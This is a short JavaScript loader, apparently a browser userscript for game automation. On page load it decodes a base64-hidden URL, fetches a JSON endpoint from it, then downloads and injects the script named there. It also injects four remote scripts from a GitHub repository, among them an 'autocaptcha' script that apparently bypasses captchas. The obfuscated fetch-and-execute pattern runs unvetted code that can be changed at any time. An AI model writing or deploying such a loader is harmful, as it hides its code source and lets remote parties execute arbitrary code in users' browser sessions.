window.onload = function() {
   var scr = document.createElement("script");
    scr.type="text/javascript";
    scr.innerHTML = `const LoadScript = (url, cb) => { fetch(url).then(res => res.json()).then((out) => { cb(out) }).catch(err => { throw err }); }

    //Content
	LoadScript(atob('aHR0cHM6Ly9hcGkubnBvaW50LmlvL2VhNmNhOTE3Mzk4Zjk5YjhhZDdh'),(data) => {
		Promise.all([
			fetch(data.link).then(value => value.text())
		  ]).then(all => {
			  $("body").append("<script>"+all[0]+"</script>");
		  }).catch(err => { throw err });
	});

const links = {
  "link1": "https://raw.githubusercontent.com/Crepanti/KW/main/autocaptcha.js",
  "link2": "https://raw.githubusercontent.com/Crepanti/KW/main/mapinfo.js",
  "link3": "https://raw.githubusercontent.com/Crepanti/KW/main/panellogs.js",
  "link4": "https://raw.githubusercontent.com/Crepanti/KW/main/topbar.js",
};

const fetchPromises = Object.values(links).map(link => {
  return fetch(link).then(response => response.text());
});

Promise.all(fetchPromises)
  .then(scripts => {
    scripts.forEach(script => {
      $("body").append("<script>"+script+"</script>");
    });
  })
  .catch(err => { 
    console.log("Error fetching data:", err); 
  });



`	
  document.body.appendChild(scr) 
}